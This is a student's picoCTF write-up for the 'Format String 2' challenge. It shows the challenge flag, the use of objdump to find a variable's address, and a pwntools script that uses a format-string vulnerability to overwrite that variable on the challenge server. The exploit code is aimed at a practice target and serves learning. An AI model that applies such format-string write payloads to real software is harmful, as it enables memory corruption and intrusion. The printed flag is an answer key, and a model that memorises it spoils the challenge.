# Format String 2

**Flag:** `picoCTF{f0rm47_57r?_f0rm47_m3m_d42f4d8d}`

- **step 1**

    This challenge required us to change the value of a variable, and to do that i first needed the address of the variable.

    To do this, i used `objdump -D vuln` and searched for the variable name `sus`, and found this:

    `0000000000404060 <sus>` 

    The value that sus would be compared to was `0x67616c66` which when converted to characters is `galf` which i assumed like the previous question, was actually reversed due to how memory works so it might be flag instead.

- **step 2**

    Now to actually put the value we have into the address we also have.

    Due to solving Scrambled RSA, i knew about pwntools and considered using that, luckily they had a page specifically for such problems

    I found this function 
    
    `pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')â†’ str` 
    
    which seemed perfect for this task.

    ```python
    from pwn import *

    context.binary = ELF('./vuln')

    p = remote('rhea.picoctf.net', 58895)

    def exec_fmt(payload):
        p = remote('rhea.picoctf.net', 58895)
        p.sendline(payload)
        return p.recvall()

    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset

    payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

    p.sendline(payload)

    flag = p.recvall()

    print("Flag: ", flag)
    ```

**What I learned:**

1. How to disassemble  a binary using objdump

**Other incorrect methods I tried:**

- I also tried using write() method.

**References**

- https://docs.pwntools.com/en/stable/fmtstr.html